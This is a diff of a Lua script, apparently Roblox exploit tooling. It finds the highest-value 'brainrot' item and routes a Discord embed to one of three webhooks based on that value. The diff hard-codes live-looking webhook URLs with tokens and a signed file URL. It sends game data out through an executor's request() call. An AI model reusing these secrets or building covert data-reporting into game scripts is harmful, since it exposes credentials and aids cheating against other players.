@@ -88,10 +88,13 @@ end
 
 local bestBrainrot = findBestBrainrot()
 
+-- Avatar URL (same for all webhooks)
+local avatarUrl = "https://sdmntprsouthcentralus.oaiusercontent.com/files/00000000-2cf8-61f7-95aa-29c702cff162/raw?se=2025-08-14T08%3A21%3A25Z&sp=r&sv=2024-08-04&sr=b&scid=4667d3f8-6027-58ed-b3f2-0b587b7429cf&skoid=0da8417a-a4c3-4a19-9b05-b82cee9d8868&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-08-14T06%3A39%3A29Z&ske=2025-08-15T06%3A39%3A29Z&sks=b&skv=2024-08-04&sig=CBkxpipulg0x4G3itLrbQcFCn53TvQD1Do4ZrtyQNSY%3D"
+
 -- Webhook message
-local function createWebhookData()
+local function createWebhookData(webhookUrl)
     local data = {
-        ["avatar_url"] = "https://sdmntprsouthcentralus.oaiusercontent.com/files/00000000-2cf8-61f7-95aa-29c702cff162/raw?se=2025-08-14T08%3A21%3A25Z&sp=r&sv=2024-08-04&sr=b&scid=4667d3f8-6027-58ed-b3f2-0b587b7429cf&skoid=0da8417a-a4c3-4a19-9b05-b82cee9d8868&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-08-14T06%3A39%3A29Z&ske=2025-08-15T06%3A39%3A29Z&sks=b&skv=2024-08-04&sig=CBkxpipulg0x4G3itLrbQcFCn53TvQD1Do4ZrtyQNSY%3D",
+        ["avatar_url"] = avatarUrl,  -- Consistent avatar URL for all webhooks
         ["content"] = "",
         ["embeds"] = {
             {
@@ -131,9 +134,27 @@ local function sendWebhook(webhookUrl, data)
     request(abcdef)
 end
 
--- Webhook URL
-local webhookUrl = "https://discordapp.com/api/webhooks/1405045594904461422/ng0umCLFBiJN9y0BynUw7MXu1DBn_eBmvnGhulw3cRBzQ4KWn2q6_WhGhBzTj4xJK7eM"
-local webhookData = createWebhookData()
+-- Determine the right webhook to send based on money per second
+local function routeWebhook()
+    local value = bestBrainrot.value
+    local webhookUrl = ""
 
--- Send the webhook
-sendWebhook(webhookUrl, webhookData)
+    if value >= 100000 and value < 1000000 then
+        -- Send to first webhook for 100k-999k
+        webhookUrl = "https://discordapp.com/api/webhooks/1405045594904461422/ng0umCLFBiJN9y0BynUw7MXu1DBn_eBmvnGhulw3cRBzQ4KWn2q6_WhGhBzTj4xJK7eM"
+    elseif value >= 1000000 and value < 10000000 then
+        -- Send to second webhook for 1M-9.9M
+        webhookUrl = "https://discordapp.com/api/webhooks/1405468233225601074/b0Wu9k-74nF_9fjLyisE0KD030tnCWXbC670LkcdgPFcxVBHfPQZ_3qkxko9bz1AHs97"
+    elseif value >= 10000000 then
+        -- Send to third webhook for 10M+
+        webhookUrl = "https://discordapp.com/api/webhooks/1405468679067406367/auyhjn5Pye8nadyHuCCOuGvkcitt2TGISZuH388cTc89fqyigJElzBclhxegMIwUYtMe"
+    end
+
+    if webhookUrl ~= "" then
+        local webhookData = createWebhookData(webhookUrl)
+        sendWebhook(webhookUrl, webhookData)
+    end
+end
+
+-- Route the webhook based on the best brainrot's value
+routeWebhook()
